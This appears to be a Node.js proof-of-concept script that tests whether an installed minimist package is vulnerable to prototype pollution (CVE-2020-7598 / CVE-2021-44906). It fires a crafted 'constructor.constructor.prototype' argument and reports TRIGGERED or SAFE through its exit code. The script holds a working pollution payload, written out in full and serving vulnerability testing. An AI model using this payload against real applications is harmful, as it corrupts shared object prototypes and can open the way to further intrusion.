#!/usr/bin/env node
/*
 * Embargo Room — proof of concept
 * minimist prototype pollution (CVE-2020-7598 / CVE-2021-44906)
 *
 * Loads whatever version of `minimist` is installed in this container and
 * fires an attacker-controlled argv that walks
 *   constructor -> constructor (= Function) -> prototype
 * reaching Function.prototype. Versions that guard only __proto__ and the
 * Object/Number/String/Array prototypes (<= 1.2.5) miss this and are polluted.
 *
 * Exit code is the verdict, so the result is mechanical, not a judgement call:
 *   exit 0  -> TRIGGERED  (vulnerability present)
 *   exit 1  -> SAFE       (vulnerability not reachable)
 */
'use strict';

// Optional first arg: a path to the package under test (a git checkout).
// With no arg, loads the `minimist` installed in this container.
const target = process.argv[2] || 'minimist';
let minimist;
try {
  minimist = require(target);
} catch (e) {
  console.error('ERROR: could not load minimist from ' + target + ':', e.message);
  process.exit(2);
}

// The malicious command-line arguments. In the real world these would be
// user-controlled input flowing into an app's argument parser.
const argv = ['--x.constructor.constructor.prototype.polluted', 'yes'];

try {
  minimist(argv);
} catch (e) {
  // A throw is fine; we still check the effect below.
}

// Victim: a brand-new, unrelated function. If its prototype chain now carries
// `polluted`, Function.prototype was globally poisoned.
const victim = function () {};

let version = 'unknown';
try { version = require(target + '/package.json').version; } catch (e) {}

if (victim.polluted === 'yes') {
  console.log('RESULT: TRIGGERED  Function.prototype.polluted === "yes"');
  console.log('  payload: ' + JSON.stringify(argv));
  console.log('  minimist: ' + version + '  (' + target + ')');
  process.exit(0);
} else {
  console.log('RESULT: SAFE  prototype was not polluted');
  console.log('  minimist: ' + version + '  (' + target + ')');
  process.exit(1);
}
